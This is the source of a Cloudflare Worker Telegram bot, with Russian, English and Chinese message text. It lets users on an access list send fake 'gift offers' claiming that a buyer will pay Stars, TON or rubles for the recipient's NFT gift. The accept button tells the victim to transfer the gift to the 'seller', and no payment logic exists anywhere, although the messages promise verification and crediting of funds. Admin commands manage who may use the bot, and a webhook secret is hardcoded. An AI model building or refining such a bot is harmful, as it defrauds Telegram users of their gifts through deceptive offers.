const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ПРОВЕРКА ДОСТУПА
      // ==========================================
      async function checkAccess(userId, username) {
          if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return true; 
          if (!kv) return false; 
          const byId = await kv.get(`allowed_id:${userId}`);
          if (byId) return true;
          if (username) {
              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
              if (byName) return true;
          }
          return false;
      }

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (kv) await kv.put(`user:${userId}`, username || "no_username");

        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
        
        const startMarkup = {
          inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
        };

        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
      }

      // --- INLINE-ЗАПРОСЫ ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username || "";

        if (kv) await kv.put(`user:${userId}`, username || "no_username");

        const hasAccess = await checkAccess(userId, username);
        if (!hasAccess) return new Response("OK", { status: 200 });

        // ЗАЩИТА ОТ ПУСТОГО ЗАПРОСА
        if (!iq.query || iq.query.trim() === "") {
             return await callApi("answerInlineQuery", { inline_query_id: iq.id, results: [], cache_time: 0 }, BOT_TOKEN);
        }

        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        let lang = "ru";
        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); } 
        else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }

        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "";
        if (giftMatch && giftMatch[0]) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
        } else {
            // Если ссылку не нашли, ставим заглушку
            giftLink = "https://t.me/telegram";
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";
        if (textQuery.includes("gram") || textQuery.includes("ton")) { currencyType = "gram"; currencyDisplay = "💎 Gram"; } 
        else if (textQuery.includes("rub") || textQuery.includes("руб")) { currencyType = "rub"; currencyDisplay = "₽ Rub"; }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
        const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
        
        let text = "";
        let btnAccept = "✅ Принять";
        let btnDecline = "❌ Отклонить";
        let titleText = "";

        if (lang === "en") {
            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`;
            btnAccept = "✅ Accept";
            btnDecline = "❌ Decline";
            titleText = `Offer from ${senderName}`;
        } else if (lang === "cn") {
            text = `🎁 <b>礼物报价</b>\n\n👤 <b>${senderName}</b> 为您提供 ${amount} ${currencyDisplay} 购买此礼物。\n\n${giftLink}\n\n⏳ 报价有效期为 5 小时 59 分钟。`;
            btnAccept = "✅ 接受";
            btnDecline = "❌ 拒绝";
            titleText = `来自 ${senderName} 的报价`;
        } else {
            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
            btnAccept = "✅ Принять";
            btnDecline = "❌ Отклонить";
            titleText = `Оффер от ${senderName}`;
        }

        const results = [{
          type: "article", id: "1",
          title: titleText,
          description: `За ${amount} ${currencyDisplay}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]] }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const chatId = cq.message.chat.id;
        
        if (cq.data === "how_to_accept") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
          const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Нажмите кнопку «🎁 Передать подарок» в сообщении от бота\n\n<b>Шаг 4.</b> Откроется страница подарка — нажмите там кнопку «Передать»\n\n<b>Шаг 5.</b> Выберите продавца из списка и подтвердите передачу\n\n<b>Шаг 6.</b> Дождитесь проверки передачи и оплаты\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка и расчёта.`;
          const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
          try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
        }

        if (cq.data === "back_to_start") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
          const userId = cq.from.id;
          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
          const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
          try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); } catch (e) {}
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const amount = dataParts[1] || "0";
          const currencyType = dataParts[2] || "stars";
          const sellerUsername = dataParts[3] || "gwrex"; 
          const giftLink = dataParts[4] || ""; 
          
          let lang = "ru";
          if (action === "acc") { lang = dataParts[5] || "ru"; } else { lang = dataParts[3] || "ru"; }
          
          let displayCurrency = "⭐ Stars";
          if (currencyType === "gram") displayCurrency = "💎 Gram";
          if (currencyType === "rub") displayCurrency = "₽ Rub";

          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };
          let alertText = "";

          if (action === "acc") {
            if (lang === "en") alertText = `Offer accepted ✅\n\nClick "Gift" to open it`;
            else if (lang === "cn") alertText = `报价已接受 ✅\n\n点击“礼物”打开它`;
            else alertText = `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`;

            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true }, BOT_TOKEN);
            
            const finalUrl = giftLink ? giftLink : ("https://t.me/" + sellerUsername);

            if (lang === "en") {
                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to seller (@${sellerUsername}).`;
                newMarkup = { inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] };
            } else if (lang === "cn") {
                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n要获得 ${amount} ${displayCurrency}，请将礼物发送给卖家 (@${sellerUsername})。`;
                newMarkup = { inline_keyboard: [[{ text: "🎁 发送礼物", url: finalUrl }]] };
            } else {
                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
                newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] };
            }
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            if (lang === "en") newText = `❌ <b>You declined the offer.</b>`;
            else if (lang === "cn") newText = `❌ <b>您拒绝了报价。</b>`;
            else newText = `❌ <b>Вы отказались от оффера.</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            try {
              await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              try { await callApi("deleteMessage", { chat_id: chatId, message_id: cq.message.message_id }, BOT_TOKEN); } catch (e) {}
            } catch (err) {}
          }
        }
      }

      // --- АДМИНКА ---
      if (update.message && update.message.text === "/stats") {
        const senderId = update.message.from.id;
        const chatId = update.message.chat.id;

        if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) { await callApi("sendMessage", { chat_id: chatId, text: "⛔ У вас нет прав." }, BOT_TOKEN); return new Response("OK", { status: 200 }); }
        if (!kv) { await callApi("sendMessage", { chat_id: chatId, text: "❌ База данных KV не подключена." }, BOT_TOKEN); return new Response("OK", { status: 200 }); }

        try {
            let cursor = undefined;
            let idsList = [];
            let usernamesList = [];

            do {
                const list = await kv.list({ cursor });
                for (const key of list.keys) {
                    if (key.name.startsWith("allowed_id:")) idsList.push(key.name.replace("allowed_id:", ""));
                    if (key.name.startsWith("allowed_username:")) usernamesList.push(key.name.replace("allowed_username:", ""));
                }
                cursor = list.cursor;
            } while (cursor);

            let statsText = `📊 <b>Список доступа:</b>\n\n👤 <b>По ID (${idsList.length}):</b>\n${idsList.length > 0 ? idsList.map(id => `<code>${id}</code>`).join(", ") : "— пусто —"}\n\n🔗 <b>По @username (${usernamesList.length}):</b>\n${usernamesList.length > 0 ? usernamesList.map(uname => `@${uname}`).join(", ") : "— пусто —"}\n\n👑 Главные админы: <code>${ADMIN_ID_1}</code>, <code>${ADMIN_ID_2}</code>`;
            await callApi("sendMessage", { chat_id: chatId, text: statsText, parse_mode: "HTML" }, BOT_TOKEN);
        } catch (err) { await callApi("sendMessage", { chat_id: chatId, text: `❌ Ошибка: ${err.message}` }, BOT_TOKEN); }
        return new Response("OK", { status: 200 });
      }

      if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
        const senderId = update.message.from.id;
        if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) return new Response("OK", { status: 200 });
        if (!kv) return new Response("OK", { status: 200 });

        const args = update.message.text.split(" ");
        const command = args[0]; 
        const targetUser = args[1]; 

        if (!targetUser) { await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Укажите ID или @username.", parse_mode: "HTML" }, BOT_TOKEN); return new Response("OK", { status: 200 }); }

        if (command === "/remove" && targetUser.toLowerCase() === "all") {
            try {
                let cursor = undefined;
                let keysToDelete = [];
                for (let i = 0; i < 3; i++) {
                    cursor = undefined;
                    do {
                        const list = await kv.list({ cursor });
                        for (const key of list.keys) {
                            if (key.name.startsWith("allowed_")) {
                                if (key.name === `allowed_id:${ADMIN_ID_1}` || key.name === `allowed_id:${ADMIN_ID_2}`) continue;
                                if (key.name === `allowed_username:gwrex`) continue;
                                keysToDelete.push(key.name);
                            }
                        }
                        cursor = list.cursor;
                    } while (cursor);
                }
                keysToDelete = [...new Set(keysToDelete)];
                for (const key of keysToDelete) await kv.delete(key);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 <b>Список доступа очищен!</b>`, parse_mode: "HTML" }, BOT_TOKEN);
            } catch (err) { console.error(err); }
            return new Response("OK", { status: 200 });
        }

        if (command === "/add") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                await kv.put(`allowed_username:${uname}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь <b>@${uname}</b> добавлен.` , parse_mode: "HTML"}, BOT_TOKEN);
            } else {
                await kv.put(`allowed_id:${targetUser}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь с ID <code>${targetUser}</code> добавлен.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        } 
        else if (command === "/remove") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                await kv.delete(`allowed_username:${uname}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь <b>@${uname}</b> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            } else {
                await kv.delete(`allowed_id:${targetUser}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь с ID <code>${targetUser}</code> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        }
        return new Response("OK", { status: 200 });
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}